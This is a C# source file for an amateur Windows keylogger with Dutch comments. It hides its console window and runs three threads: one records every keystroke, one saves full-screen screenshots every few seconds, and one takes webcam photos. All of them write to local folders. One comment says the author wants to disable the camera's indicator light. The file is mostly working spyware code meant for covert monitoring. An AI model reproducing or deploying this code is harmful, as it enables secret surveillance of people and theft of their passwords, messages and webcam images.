using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Drawing;
using System.Drawing.Imaging;
using AForge.Video;
using AForge.Video.DirectShow;




namespace keylogger
{
    class Program
    {

        #region [strings en anderen shit]

        private static DateTime datum = DateTime.Now;
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        private static decimal hour ;
        private static decimal minuten ;
        private static decimal seconde ;

        #region [webcam]

        static FilterInfoCollection WebcamColl;
        static VideoCaptureDevice Device;

        #endregion

        #endregion

        #region [windows hide]
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        
        
        static int SW_HIDE = 0;
        #endregion



        static void Main(string[] args)
        {
            IntPtr myWindow = GetConsoleWindow();
            ShowWindow(myWindow, SW_HIDE);

            Thread o1 = new Thread(logkeys);
            Thread o2 = new Thread(aantal);
            Thread o3 = new Thread(aantalwebshots);

            o1.Start();
            o2.Start();
            o3.Start();

        }

        // hij werk alleen moet nog kijken als ik het lampje uit kan zeten
        #region [webcam]

        #region [ aantal websnaphot]
        private static void aantalwebshots()
        {
            for (int i = 0; i < 1500; i++)
            {
                Thread.Sleep(2500);
                DateTime TimeNow = DateTime.Now;
                seconde = TimeNow.Second;
                WebcamColl = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                //if you have connected with one more camera choose index as you want 
                Device = new VideoCaptureDevice(WebcamColl[0].MonikerString);
                Device.Start();
                Device.NewFrame += new NewFrameEventHandler(imagesave);
            }
        }

        #endregion

        #region [webcam fotos maken]
        static void imagesave(object sender, NewFrameEventArgs eventArgs)
        {
            Image img = (Bitmap)eventArgs.Frame.Clone();
            string fileName = ".jpg";
            string folderName = @"D:/keylogger/webcam/";
            string pathString = System.IO.Path.Combine(folderName, "" + datum.ToShortDateString() + "/");
            System.IO.Directory.CreateDirectory(pathString);
            img.Save(pathString + hour + "." + minuten + "." + seconde + fileName);
            Device.SignalToStop();
        }

        #endregion

        #endregion
        
        // volgens mij werk deze wel zo als het moet

        #region[screenshots]

        #region [ aantal screenshots]
        private static void aantal()
        {
            for (int i = 0; i < 500000000; i++)
            {


                DateTime TimeNow = DateTime.Now;
                hour = TimeNow.Hour;
                minuten = TimeNow.Minute;
                seconde = TimeNow.Second;
                printscreen();
            }
        }

        #endregion

        #region [printscreens]
        private static void printscreen()
        {
            Thread.Sleep(2500);
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }

                string folderName = @"D:/keylogger/screenshot/";
                string pathString = System.IO.Path.Combine(folderName, "" + datum.ToShortDateString() + "/");
                System.IO.Directory.CreateDirectory(pathString);
                bitmap.Save(pathString + hour + "." + minuten + "." + seconde + ".jpeg", ImageFormat.Jpeg);


            }
        }

        #endregion

        #endregion

        // keyloger moet nog wat aangepast worden
        #region [keylogger]
        static void logkeys()
        {

            string folderName = @"D:/keylogger/keylog";
            string pathString = System.IO.Path.Combine(folderName);
            System.IO.Directory.CreateDirectory(pathString);
            string path = (pathString+"/"+ datum.ToShortDateString() + ".text");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                }
            }
            KeysConverter converter = new KeysConverter();
            string text = "";

            while (true)
            {

                //Thread.Sleep(5);

                 for(Int32 i = 0; i<255; i++)
                 {

                    int key = GetAsyncKeyState(i);

                    if (key == 1 || key == -32767)
                    {

                        text = converter.ConvertToString(i);
                        using (StreamWriter sw = File.AppendText(path))
                        {

                            //hier zit het probleem

                            
                            if (text == "Space")
                            {

                                sw.Write(" ");

                            }
                            else if (text == "Enter")
                            {
                                sw.Write(" " + datum.ToLongTimeString());
                                sw.Write("[Enter]");

                            }
                            else if (text == "Back")
                            {

                                
                                sw.Write("[Back]");

                            }
                            else
                            {

                                sw.Write(text);
                            }
                            

                        }
                        break;
                    }

                 }

            }
            
        }

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }
        #endregion

    }
}
